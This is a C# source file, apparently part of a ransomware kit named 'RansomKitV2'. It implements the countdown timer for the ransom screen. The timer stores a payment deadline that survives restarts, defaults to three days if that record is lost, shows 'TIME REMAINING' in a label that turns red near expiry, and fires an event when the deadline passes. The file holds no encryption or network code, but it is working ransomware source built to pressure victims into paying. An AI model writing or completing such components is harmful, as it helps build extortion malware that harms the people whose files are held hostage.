using System;
using System.Drawing;
using System.Windows.Forms;

namespace RansomKitV2
{
    public sealed class CountdownTimer : IDisposable
    {
        private readonly System.Windows.Forms.Timer _timer;
        private readonly Label _display;
        private DateTime _deadlineUtc;
        private bool _expired;
        private bool _disposed;

        public event EventHandler Expired;

        public bool IsExpired => _expired;

        public TimeSpan Remaining
        {
            get
            {
                var r = _deadlineUtc - DateTime.UtcNow;
                return r < TimeSpan.Zero ? TimeSpan.Zero : r;
            }
        }

        public CountdownTimer(Label display)
        {
            _display = display ?? throw new ArgumentNullException(nameof(display));
            _timer = new System.Windows.Forms.Timer { Interval = 100 }; // 100ms for smooth ticking
            _timer.Tick += OnTick;
        }

        public void Start(TimeSpan duration)
        {
            _deadlineUtc = DateTime.UtcNow.Add(duration);
            Persistence.SaveDeadline(_deadlineUtc);
            _expired = false;
            UpdateDisplay();
            _timer.Start();
        }

        public void Resume()
        {
            var stored = Persistence.LoadDeadline();
            if (stored == null)
            {
                // Fallback if deadline was somehow lost
                Start(TimeSpan.FromDays(3));
                return;
            }
            _deadlineUtc = stored.Value;
            _expired = false;
            UpdateDisplay();
            _timer.Start();
        }

        public void Stop()
        {
            _timer.Stop();
            Persistence.ClearDeadline();
        }

        private void OnTick(object sender, EventArgs e)
        {
            if (_expired) return;
            UpdateDisplay();
            if (DateTime.UtcNow >= _deadlineUtc)
            {
                _expired = true;
                _timer.Stop();
                Expired?.Invoke(this, EventArgs.Empty);
            }
        }

        private void UpdateDisplay()
        {
            if (_display == null || _display.IsDisposed) return;

            var t = Remaining;

            // Format: Xd HH:MM:SS
            // If days is 0, show HH:MM:SS
            string timeText = t.Days > 0
                ? $"{t.Days}d {t.Hours:00}:{t.Minutes:00}:{t.Seconds:00}"
                : $"{t.Hours:00}:{t.Minutes:00}:{t.Seconds:00}";

            _display.Text = $"TIME REMAINING: {timeText}";

            // Turn red when less than 1 minute remains
            _display.ForeColor = t.TotalMinutes <= 1 ? Color.Red : Color.WhiteSmoke;
        }

        public void Dispose()
        {
            if (_disposed) return;
            _disposed = true;
            _timer.Tick -= OnTick;
            _timer.Dispose();
        }
    }
}